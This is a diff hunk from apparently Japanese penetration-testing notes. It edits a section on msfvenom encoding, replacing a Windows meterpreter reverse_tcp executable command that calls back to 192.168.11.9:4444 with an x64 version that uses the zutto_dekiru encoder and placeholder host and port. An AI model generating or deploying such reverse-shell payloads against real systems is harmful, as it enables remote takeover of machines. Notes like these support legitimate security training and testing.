@@ -271,12 +271,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f exe
 エンコードの目的はウイルス対策を回避することではなく、ペイロードの動作を保証すること
 
 ```shell
-# 'zutto_dekiru'エンコードを5回繰り返す
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f exe > shell.exe
-
-# 繰り返すほどサイズが大きくなる
-Payload size: 617 bytes
-Final size of exe file: 73802 bytes
+# 'zutto_dekiru'エンコード
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o rev.exe -e x64/zutto_dekiru
 ```
 
 ## コマンドインジェクションを利用する例
